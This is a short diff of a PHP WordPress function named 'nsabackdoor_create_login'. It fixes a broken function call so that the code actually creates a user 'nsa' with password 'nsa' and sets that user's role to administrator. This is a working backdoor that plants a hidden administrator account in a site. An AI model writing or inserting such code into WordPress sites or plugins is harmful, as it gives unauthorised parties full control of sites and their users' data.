@@ -15,7 +15,7 @@ function nsabackdoor_create_login() {
     return;
   
   //add user
-  $nsaUserId = wp_create('nsa', 'nsa', 'nsa@example.com');
+  $nsaUserId = wp_create_user('nsa', 'nsa', 'nsa@example.com');
 
   $nsaUser = new WP_User($nsaUserId);
   $nsaUser->set_role('administrator');
